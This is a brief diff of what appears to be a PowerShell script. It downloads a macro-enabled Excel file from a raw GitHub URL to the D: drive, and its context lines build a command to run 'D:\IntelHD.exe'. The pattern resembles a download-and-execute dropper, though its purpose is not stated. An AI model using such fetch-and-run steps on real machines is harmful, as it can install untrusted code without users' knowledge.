@@ -29,7 +29,7 @@ $command3="cmd /C D:\IntelHD.exe"
 #invoke-expression $command
 
 #Part 4 - Download 
-$my_path_d="D:\Automate.xlsm"
+$my_path_d="D:\A.xlsm"
 $url='https://raw.githubusercontent.com/FurqanKhan1/D/master/Automate.xlsm';
 $b.DownloadFile($url, $my_path_d) ;
 
